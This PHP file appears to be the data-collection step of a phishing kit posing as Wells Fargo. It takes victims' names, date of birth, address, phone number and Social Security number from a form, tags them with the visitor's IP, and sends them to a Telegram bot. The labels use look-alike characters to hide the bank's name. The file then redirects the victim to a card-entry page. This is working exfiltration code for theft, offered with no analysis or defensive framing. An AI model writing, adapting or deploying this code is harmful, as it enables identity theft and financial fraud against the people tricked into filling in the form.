<?php

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


# post date

$a1 = $_POST['name1'];
$b1 = $_POST['name2'];
$a2 = $_POST['dob'];
$b2 = $_POST['address'];
$a3 = $_POST['country'];
$b3 = $_POST['city'];
$a4 = $_POST['state'];
$b4 = $_POST['zip'];
$a5 = $_POST['phone'];
$b5 = $_POST['ssn'];

$IP = get_client_ip();

# variable

$data .= "<---- РеrѕοnаІ Іnfοrmаtiοn : {$IP} ---->\n\n";
$data .= "Page : WеІІѕ Fаrɡο\n\n";
$data .= "First Name   : {$a1}\n";
$data .= "Last Name   : {$b1}\n";
$data .= "Date of Birth : {$a2}\n";
$data .= "Address : {$b2}\n";
$data .= "Country : {$a3}\n";
$data .= "City : {$b3}\n";
$data .= "State : {$a4}\n";
$data .= "Zip Code : {$b4}\n";
$data .= "Phone Number : {$a5}\n";
$data .= "SSN : {$b5}\n";



# Telegram Bot

$token = file_get_contents("../../config/token.txt");
$id = file_get_contents("../../config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";

$params=[
	'chat_id'=>$id,
	'text'=>$data,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

# Head Back To Next Step

header('Location: ../../card.php');


?>